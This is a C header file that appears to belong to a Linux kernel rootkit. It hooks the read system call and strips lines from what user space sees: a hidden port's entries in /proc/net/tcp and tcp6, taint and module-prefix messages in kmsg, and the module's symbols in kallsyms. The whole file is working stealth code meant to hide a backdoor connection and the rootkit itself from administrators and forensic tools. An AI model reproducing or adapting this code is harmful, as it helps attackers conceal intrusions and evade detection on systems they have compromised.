#ifndef _READ_H_
#define _READ_H_

#include <linux/file.h>

#define HIDE_PORT 8443

static char portstr[8];

static asmlinkage long (*og_read)(unsigned int fd, char __user *buf,
                                  size_t count);

static bool line_contains(const char *hay, size_t hlen, const char *needle)
{
    size_t n = strlen(needle);

    if (!n || hlen < n)
        return false;

    for (; hlen >= n; hay++, hlen--)
        if (!memcmp(hay, needle, n))
            return true;

    return false;
}

static long drop_lines(char *buf, long ret, const char **needles, int n)
{
    char *line = buf;
    char *end  = buf + ret;
    int i;

    while (line < end) {
        char *next = memchr(line, '\n', end - line);
        size_t len = next ? (size_t)(next - line + 1)
                          : (size_t)(end - line);
        bool drop = false;

        for (i = 0; i < n; i++)
            if (line_contains(line, len, needles[i])) {
                drop = true;
                break;
            }

        if (drop) {
            ret -= len;
            end -= len;
            memmove(line, line + len, end - line);
        } else {
            line += len;
        }
    }

    return ret;
}

static long filter_user_buf(char __user *buf, long ret,
                            const char **needles, int n)
{
    char *kbuf;

    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, buf, ret)) {
        kfree(kbuf);
        return ret;
    }

    ret = drop_lines(kbuf, ret, needles, n);
    if (copy_to_user(buf, kbuf, ret))
        ret = -EFAULT;
    kfree(kbuf);
    return ret;
}

static asmlinkage long hooked_read(unsigned int fd, char __user *buf,
                                   size_t count)
{
    static const char *tcp_n[]  = { portstr };
    static const char *kmsg_n[] = { PREFIX, "taint" };
    static const char *ksym_n[] = { PREFIX };

    long ret = og_read(fd, buf, count);
    struct file *file;
    const char *name;
    int filter = 0;

    if (ret <= 0)
        return ret;

    file = fget(fd);
    if (!file)
        return ret;

    /* stable name snapshot under RCU (rename-safe) */
    rcu_read_lock();
    name = file->f_path.dentry->d_name.name;

    if (name[0] == 't') {
        if (strcmp(name, "tcp") == 0 || strcmp(name, "tcp6") == 0)
            filter = 1;
    } else if (name[0] == 'k') {
        if (strcmp(name, "kmsg") == 0)
            filter = 2;
        else if (strcmp(name, "kallsyms") == 0)
            filter = 3;
    }
    rcu_read_unlock();

    fput(file);

    switch (filter) {
    case 1:  return filter_user_buf(buf, ret, tcp_n, 1);
    case 2:  return filter_user_buf(buf, ret, kmsg_n, 2);
    case 3:  return filter_user_buf(buf, ret, ksym_n, 1);
    default: return ret;
    }
}

/* call once from init, BEFORE hooks install */
static void hide_conn_init(void)
{
    snprintf(portstr, sizeof(portstr), ":%04X", HIDE_PORT);
}

#endif